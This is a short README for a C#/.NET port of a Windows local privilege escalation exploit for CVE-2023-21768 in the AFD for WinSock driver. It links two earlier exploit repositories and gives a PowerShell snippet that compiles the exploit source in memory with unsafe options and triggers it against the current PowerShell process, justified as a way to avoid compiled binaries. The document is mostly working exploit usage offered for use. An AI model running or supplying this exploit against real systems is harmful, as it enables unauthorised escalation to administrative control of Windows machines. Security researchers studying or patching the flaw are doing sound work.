# CVE-2023-21768 - Dotnet

Dotnet / c# port of AFD-for-WinSock-EoP exploit

References:

- https://github.com/zoemurmure/CVE-2023-21768-AFD-for-WinSock-EoP-exploit
- https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768

## Why?

Sometimes you can't use compiled binaries.

## How to?

Run the following in powershell.

```powershell
$PWSH_PID = ([System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -ExpandProperty ID)
echo "[*] Current powershell PID: $PWSH_PID"
echo "[+] Compiling EoP exploit"
Add-Type -Path eop.cs -CompilerOptions "-unsafe"
echo "[+] Triggering exploit"
[XOR.EoP]::Run($PWSH_PID)
echo "[+] Exploit finished"
```
